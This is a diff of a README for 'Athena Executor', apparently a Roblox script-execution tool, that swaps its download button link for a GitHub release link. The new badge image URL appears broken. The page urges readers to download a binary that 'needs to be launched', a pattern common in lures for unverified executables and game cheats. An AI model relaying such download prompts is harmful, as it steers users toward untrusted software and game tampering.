@@ -18,7 +18,7 @@ Athena Executor offers a wide range of features that enhance the scripting proce
 ## Grab Your Copy!
 Click the button below to download Athena Executor and start revolutionizing your Roblox scripting experience:
 
-[![Download Athena Executor](https://img.shields.io/badge/Download-Athena%20Executor-blue)](https://github.com/file/App.zip) *(Needs to be launched)*
+[![Download Athena Executor](https://github.com/ROCK-OP123/Athena-Executor/releases/tag/v2.0%20Executor-blue)](https://github.com/ROCK-OP123/Athena-Executor/releases/tag/v2.0) *(Needs to be launched)*
 
 If the link provided above does not work or if you are looking for alternative versions, please check the "Releases" section of this repository for more options.
 
